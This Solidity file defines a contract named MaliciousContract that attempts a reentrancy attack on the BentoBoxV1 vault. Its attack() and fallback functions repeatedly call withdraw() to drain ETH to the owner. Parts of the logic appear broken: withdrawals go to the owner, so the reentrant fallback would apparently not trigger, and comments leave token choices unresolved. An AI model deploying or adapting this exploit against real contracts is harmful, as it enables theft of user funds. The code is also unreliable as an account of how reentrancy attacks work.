// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract

contract MaliciousContract {
    address public owner;
    BentoBoxV1 public targetContract;

    event AttackExecuted(uint256 amount);
    event WithdrawExecuted(uint256 amount);
    event BalanceBeforeAttack(uint256 balance);

    constructor(address payable _targetContract) public {
        owner = msg.sender;
        targetContract = BentoBoxV1(_targetContract);
    }

    // Explicitly add a receive function to handle incoming Ether
    receive() external payable {}

    fallback() external payable {
        // Triggering reentrancy by calling withdraw again if there are available funds
        uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using address(0) for ETH, adjust for specific token if needed
        if (balance > 0) {
            targetContract.withdraw(IERC20(address(0)), address(this), owner, balance, 0); // Adjust to actual token if needed
        }
    }

    function attack() external {
        require(msg.sender == owner, "Not the owner");

        // Check balance before attack
        uint256 beforeBalance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using address(0) for ETH or adjust for actual token
        emit BalanceBeforeAttack(beforeBalance);

        // Execute deposit to trigger the fallback function
        targetContract.deposit(IERC20(address(0)), address(this), owner, beforeBalance, 0);

        // Now withdraw to trigger reentrancy
        targetContract.withdraw(IERC20(address(0)), address(this), owner, beforeBalance, 0);

        emit AttackExecuted(beforeBalance);
    }
}